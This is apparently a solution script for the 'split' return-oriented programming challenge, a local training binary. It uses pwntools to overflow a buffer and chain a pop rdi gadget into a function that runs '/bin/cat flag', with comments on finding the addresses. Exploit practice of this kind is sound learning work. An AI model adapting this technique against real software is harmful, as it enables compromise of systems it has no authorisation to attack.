from pwn import *

p = process("./split")

offset = 0x20 + 0x8

useful = 0x40074b
bin_cat = 0x00601060
pop_rdi = 0x004007c3

payload = b"E"*offset
payload += p64(pop_rdi) + p64(bin_cat) + p64(useful)

p.recvuntil(b">")

p.sendline(payload)
p.interactive()

# this just required me to do something like
# rabin2 -z ./split
# got the memory address of /bin/cat from dump
# pop the memory address into rdi and then call function
# to get flag
